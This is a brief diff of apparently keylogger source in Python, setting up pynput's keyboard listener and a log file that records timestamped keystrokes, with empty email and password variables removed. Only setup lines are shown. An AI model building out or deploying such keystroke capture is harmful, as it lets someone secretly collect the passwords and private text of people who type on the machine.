@@ -1,10 +1,6 @@
 import logging
 from pynput.keyboard import Listener
 
-
-EMAIL = ''
-PASSWORD = ''
-
 log_dir = r'C:/Users/jonat/PycharmProjects/keylogger'
 logging.basicConfig(filename=(log_dir + "/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
